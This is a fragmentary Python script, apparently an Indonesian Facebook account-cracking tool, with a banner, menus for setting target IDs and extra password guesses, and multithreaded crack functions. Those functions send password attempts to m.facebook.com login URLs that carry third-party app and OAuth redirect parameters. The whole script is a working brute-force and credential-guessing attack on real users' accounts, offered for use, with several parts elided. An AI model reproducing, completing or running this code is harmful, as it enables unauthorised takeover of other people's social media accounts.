...
def banner():
	clear()
	alvino_xy(f'''\t{asu} 
{h}__  __ ____  ______ _____ 
{h}|  \/  |  _ \|  ____|_   _|
{h}| \  / | |_) | |__    | |  
{h}| |\/| |  _ <|  __|   | |  
{h}| |  | | |_) | |     _| |_ 
{h}|_|  |_|____/|_|    |_____|
{h}•{h}•{h}•{sir} Welcome, Selamat Crack Masbroo! {x}{h}•{h}•{h}•{x}''')               
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def setting():
	...
	if hu in ['1','01']:
		...
		for bacot in id:
			...
			id2.insert(xx,bacot)
			os.system('clear')
			print('Awokawokawok kena prank ya bro, sabar yaa:) ')
	else:
...
#		taplikasi.append('no')
	...
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak(nel('[[cyan]•[white]] [•] Masukkan Katasandi Tambahan Minimal 6 Karakter\n[[cyan]•[white]] Contoh :[green] bismillah,sayang,katasandi[white] '))
...
def passwrd():
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'reguler' in method:
				...
				pool.submit(crackasync,idf,pwv)
	print('')
	cetak(nel('\t[cyan]>>[green] Crack Selesai Terimakasih [cyan] <<[white] '))
	...
	if woi in ['y','Y']:
		...
		print(f'\t{x}>>{k} Good Bye, See You{x} << ')
		time.sleep(2)
		exit()
#--------------------[ METHODE-REGULER ]-----------------#
def crack(idf,pwv):
	...
	for pw in pwv:
		try:
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=966242223397117&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fsharer%2Fsharer.php%3Fu%3Dhttps%253A%252F%252Fpc-chain.com%252Fsns%252Ffacebook-install-iphone%252F%26t%3D%25E3%2580%2590Facebook%25E3%2580%2591iPhone%25E3%2581%25AB%25E3%2582%25A4%25E3%2583%25B3%25E3%2582%25B9%25E3%2583%2588%25E3%2583%25BC%25E3%2583%25AB%25E3%2581%2599%25E3%2582%258B%25E6%2596%25B9%25E6%25B3%2595&cancel_url=https%3A%2F%2Fm.facebook.com%2Fdialog%2Fclose_window%2F%3Fapp_id%3D966242223397117%26connect%3D0%23_%3D_&display=touch&locale=id_ID&_rdr')
			data = {
...
def crackasync(idf,pwv):
	...
	for pw in pwv:
		try:
			...
			p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=569038086638451&kid_directed_site=0&app_id=569038086638451&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fclient_id%3D569038086638451%26response_type%3Dcode%26scope%3Demail%26redirect_uri%3Dhttps%253A%252F%252Fapi.fortress-ww-prd.lightricks.com%252Fv2%252Fauth%252Foauth%252Ffacebook%252Fcallback%26state%3DeyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..TMvjJbnetcREa4NQ1wzjX36eCkBjA2zZ5wvm45Zr31c%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D4fcb4b34-4e6a-4c6d-9923-351a88ba8dd9%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fapi.fortress-ww-prd.lightricks.com%2Fv2%2Fauth%2Foauth%2Ffacebook%2Fcallback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DeyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..TMvjJbnetcREa4NQ1wzjX36eCkBjA2zZ5wvm45Zr31c%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			...
			"sec-fetch-user": "?1",
			"referer": "https://m.facebook.com/v14.0/dialog/oauth?client_id=569038086638451&response_type=code&scope=email&redirect_uri=https%3A%2F%2Fapi.fortress-ww-prd.lightricks.com%2Fv2%2Fauth%2Foauth%2Ffacebook%2Fcallback&state=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9..TMvjJbnetcREa4NQ1wzjX36eCkBjA2zZ5wvm45Zr31c&ret=login&fbapp_pres=0&logger_id=4fcb4b34-4e6a-4c6d-9923-351a88ba8dd9&tp=unspecified",
